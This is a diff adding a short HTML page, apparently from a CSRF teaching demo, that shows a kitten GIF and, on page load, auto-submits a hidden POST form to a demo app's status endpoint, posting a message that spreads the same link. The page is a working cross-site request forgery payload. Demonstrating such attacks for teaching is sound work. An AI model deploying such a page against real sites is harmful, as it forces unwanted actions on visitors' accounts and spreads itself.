@@ -1,0 +1,17 @@
+<html>
+<head>
+</head>
+<body>
+  <iframe src="https://giphy.com/embed/3oriO0OEd9QIDdllqo" width="480" height="477" frameBorder="0" class="giphy-embed" allowFullScreen></iframe><p><a href="https://giphy.com/gifs/jerseydemic-3oriO0OEd9QIDdllqo">via GIPHY</a></p>
+  <script>
+  console.log('Performing CSRF attack in 3 seconds...')
+  window.setTimeout(function() {
+    console.log('Submitting form')
+    document.CSRFForm.submit()
+  }, 3000)
+  </script>
+  <form method="POST" name="CSRFForm" action="https://csrf-example.herokuapp.com/status/">
+    <input type="hidden" name="message" value="Check out this cute kitten! https://consideratecode.github.io/csrf-example/kitten.html">
+  </form>
+</body>
+</html>
